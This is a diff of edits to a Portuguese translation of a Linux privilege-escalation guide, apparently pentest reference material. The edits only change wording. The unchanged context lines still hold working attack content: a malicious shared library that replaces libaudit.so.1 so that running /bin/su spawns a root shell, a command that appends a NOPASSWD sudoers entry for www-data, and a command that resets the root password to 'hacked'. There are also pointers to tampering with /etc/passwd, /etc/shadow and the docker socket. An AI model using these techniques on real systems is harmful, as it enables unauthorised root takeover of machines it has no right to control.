@@ -48,14 +48,14 @@ return 0;
 
 ### Arquivos comuns
 
-- Adicionar usuário com senha ao _/etc/passwd_
+- Adicionar usuário com senha a _/etc/passwd_
 - Alterar a senha dentro de _/etc/shadow_
 - Adicionar usuário aos sudoers em _/etc/sudoers_
-- Explorar o docker por meio do docker socket, geralmente em _/run/docker.sock_ ou _/var/run/docker.sock_
+- Abusar do docker por meio do docker socket, geralmente em _/run/docker.sock_ ou _/var/run/docker.sock_
 
 ### Sobrescrevendo uma biblioteca
 
-Verifique uma biblioteca usada por algum binário; neste caso, `/bin/su`:
+Verifique uma biblioteca usada por algum binário, neste caso `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -68,7 +68,7 @@ libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
 Neste caso, vamos tentar personificar `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Então, verifique as funções desta library usadas pelo binário **`su`**:
+Então, verifique as funções desta biblioteca usadas pelo binário **`su`**:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Os símbolos `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` e `audit_fd` provavelmente pertencem à biblioteca libaudit.so.1. Como a libaudit.so.1 será sobrescrita pela biblioteca compartilhada maliciosa, esses símbolos devem estar presentes na nova biblioteca compartilhada; caso contrário, o programa não conseguirá encontrar o símbolo e será encerrado.
+Os símbolos `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` e `audit_fd` provavelmente pertencem à biblioteca libaudit.so.1. Como a libaudit.so.1 será sobrescrita pela shared library maliciosa, esses símbolos devem estar presentes na nova shared library; caso contrário, o programa não conseguirá encontrar o símbolo e será encerrado.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,7 +98,7 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Agora, apenas chamando **`/bin/su`**, você obterá um shell como root.
+Agora, basta chamar **`/bin/su`** para obter um shell como root.
 
 ## Scripts
 
@@ -108,7 +108,7 @@ Você consegue fazer o root executar alguma coisa?
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **Alterar senha do root**
+### **Alterar a senha do root**
 ```bash
 echo "root:hacked" | chpasswd
 ```
